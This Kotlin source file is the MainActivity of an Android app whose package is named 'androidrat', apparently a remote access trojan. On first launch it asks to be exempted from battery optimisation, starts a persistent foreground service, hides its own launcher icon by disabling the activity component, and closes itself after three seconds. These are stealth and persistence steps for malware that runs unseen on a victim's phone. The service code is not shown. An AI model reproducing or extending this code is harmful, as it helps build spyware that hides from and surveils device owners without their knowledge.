package com.example.androidrat

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity

class MainActivity : ComponentActivity() {
    private lateinit var prefs: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("MAIN", "onCreate EXECUTADO!")
        prefs = getSharedPreferences("setup", Context.MODE_PRIVATE)

        if (prefs.getBoolean("done", false)) {
            Log.d("MAIN", "Já feito - fechando")
            finish()
            return
        }

        // PERMISSÃO IMEDIATA
        batteryPermission()

        // SERVICE IMEDIATO
        val serviceIntent = Intent(this, ForegroundPersistentService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        Log.d("MAIN", "Service iniciado")

        // ESCONDE ÍCONE
        hideIcon()
        prefs.edit().putBoolean("done", true).apply()

        // FECHA em 3s
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            Log.d("MAIN", "FECHANDO")
            finish()
        }, 3000)
    }

    private fun batteryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.d("MAIN", "PEDINDO PERMISSÃO")
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } else {
                Log.d("MAIN", "Permissão OK")
            }
        }
    }

    private fun hideIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MAIN", "ÍCONE ESCONDIDO")
        } catch (e: Exception) {
            Log.e("MAIN", "Erro hide: ${e.message}")
        }
    }
}
